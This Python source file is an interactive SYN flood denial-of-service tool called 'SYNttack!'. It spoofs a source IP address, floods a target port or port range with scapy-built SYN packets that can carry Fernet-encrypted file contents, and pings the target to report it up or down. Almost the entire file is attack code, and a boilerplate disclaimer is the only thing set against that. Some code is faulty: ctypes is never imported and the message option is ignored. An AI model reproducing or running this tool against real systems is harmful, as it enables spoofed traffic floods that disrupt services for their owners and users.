# Broken DOS attack tool that sends a flood of SYN packets to a target IP address. This tool is for legal and
# legitimate use cases only. Elemen.dev is not responsible for irresponsible or malicious use of this script.
#
# You can attach messages and files to each packet.
# Encryption is optional.
#
# By Elemen.dev

import os
import sys
from scapy.all import *
import threading
from cryptography.fernet import Fernet
import datetime
from pythonping import ping
from tabulate import tabulate
from colorama import Fore, Style, init
from tqdm import tqdm
import time
from prompt_toolkit import prompt

init(autoreset=True)

# Suppress Scapy warnings by setting verbosity to 0
conf.verb = 0


def is_admin():
    try:
        return os.getuid() == 0
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0


if not is_admin():
    print(
        Fore.RED + "This script requires administrative privileges. Please run as an administrator." + Style.RESET_ALL)
    sys.exit(1)


def check_port_status(target_ip, target_port):
    ping_result = ping(target_ip, count=1, timeout=1)
    return ping_result.success()


class Net:
    def __init__(self, src_ip):
        self.src_ip = src_ip
        self.cipher_suite = None
        self.status_table = []
        self.pbar = None
        self.initialize_cipher_suite()

    def initialize_cipher_suite(self):
        key_file = "encryption_key.txt"
        encrypt_data = input(
            Fore.CYAN + "Do you want to encrypt the data? The encryption key will be stored in your current directory "
                        "(yes/no): " + Style.RESET_ALL).lower() == "yes"

        if encrypt_data:
            if os.path.exists(key_file):
                with open(key_file, "rb") as key_file:
                    key, timestamp = key_file.read().split(b"|")
            else:
                key = Fernet.generate_key()
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S").encode()
                with open(key_file, "wb") as key_file:
                    key_file.write(key + b"|" + timestamp)

            self.cipher_suite = Fernet(key)

    def synFloodAttack(self, target_ip, target_port_range_start, target_port_range_end, single_port=None,
                       file_path=None, message=None,
                       num_packets=100):
        threads = []
        self.pbar = tqdm(total=num_packets, desc="Sending Packets", dynamic_ncols=True, leave=False)

        if single_port is not None:
            self.send_packets_to_single_port(target_ip, single_port, file_path, message, num_packets)
        else:
            for port in range(target_port_range_start, target_port_range_end + 1):
                self.send_packets_to_single_port(target_ip, port, file_path, message, num_packets)

        time.sleep(2)
        self.pbar.close()
        self.display_status_table()

    def send_packets_to_single_port(self, target_ip, target_port, file_path, message, num_packets):
        if check_port_status(target_ip, target_port):
            if self.cipher_suite:
                if file_path:
                    with open(file_path, "rb") as file:
                        file_data = file.read()
                    encrypted_message = self.cipher_suite.encrypt(file_data)
                else:
                    encrypted_message = b""

                for _ in range(num_packets):
                    pkt = IP(src=self.src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port,
                                                                   flags="S") / encrypted_message
                    send(pkt, verbose=0)

                    ping_result = ping(target_ip)
                    status = "Up" if ping_result.success() else "Down"
                    status_color = Fore.GREEN if status == "Up" else Fore.RED
                    self.pbar.update(1)
                    self.update_status_table(target_ip, target_port, status_color + status + Style.RESET_ALL)
                    time.sleep(0.1)
            else:
                for _ in range(num_packets):
                    pkt = IP(src=self.src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
                    send(pkt, verbose=0)

                    ping_result = ping(target_ip)
                    status = "Up" if ping_result.success() else "Down"
                    status_color = Fore.GREEN if status == "Up" else Fore.RED
                    self.pbar.update(1)
                    self.update_status_table(target_ip, target_port, status_color + status + Style.RESET_ALL)
                    time.sleep(0.1)

    def update_status_table(self, target_ip, target_port, status):
        entry = (target_ip, target_port, status)

        for i, row in enumerate(self.status_table):
            if row[:2] == (target_ip, target_port):
                self.status_table[i] = entry
                return

        self.status_table.append(entry)

    def display_status_table(self):
        os.system('clear')
        table_headers = ["Target IP", "Port", "Status"]
        table_data = []

        for row in self.status_table:
            target_ip, port, status = row
            table_data.append([target_ip, port, status])

        print("\nStatus Table:")
        print(tabulate(table_data, headers=table_headers, tablefmt="grid"))


def main():
    title = f"{'=' * 40}\n{'SYNttack!':^40}\n{'by Elemen.dev'}\n{'=' * 40}"
    description = (
        f"\n{'=' * 40}\n{'Description':^40}\n{'=' * 40}\n"
        f"This tool allows you to send a flood of SYN packets to an IP address. You can specify a single port or a "
        f"range of ports.\n"
        f"You can also include messages and files in each packet. You can send as many packets as you desire.\n\n"
        f"Note: This tool is for legal and legitimate use cases only. elemen.dev is not responsible for irresponsible "
        f"or malicious use of this script.\n"
        f"{'=' * 40}"
    )

    print(Fore.YELLOW + title + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + description + Style.RESET_ALL)
    input(Fore.CYAN + "Press Enter to continue..." + Style.RESET_ALL)

    os.system('clear')

    src_ip = input(Fore.CYAN + "Enter an IP address to display as the source: " + Style.RESET_ALL)
    target_ip = input(Fore.CYAN + "Enter the IP address of the target: " + Style.RESET_ALL)

    single_port_option = input(Fore.CYAN + 'Do you want to specify a single port? If no, you will be prompted for a '
                                           'range. (yes/no): ' + Style.RESET_ALL).lower()
    if single_port_option == "yes":
        single_port = int(input(Fore.CYAN + "Enter the port to attack: " + Style.RESET_ALL))
        target_port_range_start = target_port_range_end = single_port
    else:
        target_port_range_start = int(input(Fore.CYAN + "Enter the start of the port range: " + Style.RESET_ALL))
        target_port_range_end = int(input(Fore.CYAN + "Enter the end of the port range: " + Style.RESET_ALL))
        single_port = None

    send_file = input(Fore.CYAN + "Do you want to send a file? (yes/no): " + Style.RESET_ALL).lower() == "yes"
    if send_file:
        file_path = input(Fore.CYAN + "Enter the path to the file to send: " + Style.RESET_ALL)
    else:
        file_path = None

    send_message = input(Fore.CYAN + "Do you want to send a message? (yes/no): " + Style.RESET_ALL).lower() == "yes"
    if send_message:
        message = input(Fore.CYAN + "Enter the message to send: " + Style.RESET_ALL)
    else:
        message = None

    num_packets = int(input(Fore.CYAN + "Enter the number of packets you want to send: " + Style.RESET_ALL))

    net_obj = Net(src_ip)
    net_obj.synFloodAttack(target_ip, target_port_range_start, target_port_range_end, single_port, file_path, message,
                           num_packets)


if __name__ == "__main__":
    main()
